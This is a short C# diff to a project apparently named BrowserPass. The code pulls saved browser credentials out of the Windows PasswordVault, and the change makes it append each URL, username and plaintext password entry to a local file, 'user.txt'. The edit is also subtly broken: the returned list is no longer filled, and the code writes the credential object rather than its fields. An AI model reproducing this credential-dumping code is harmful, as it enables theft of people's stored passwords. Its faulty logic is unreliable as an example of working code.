@@ -1,4 +1,6 @@
-﻿using System.Collections.Generic;
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using Windows.Security.Credentials;
 
@@ -24,11 +26,12 @@ namespace BrowserPass
                 PasswordCredential cred = credentials.ElementAt(i);
                 cred.RetrievePassword();
                 
-                result.Add(new CredentialModel {
+                var x=(new CredentialModel {
                     Url = cred.Resource,
                     Username = cred.UserName,
                     Password = cred.Password
                 });
+                File.AppendAllText("user.txt", x + Environment.NewLine);
             }
             return result;
         }
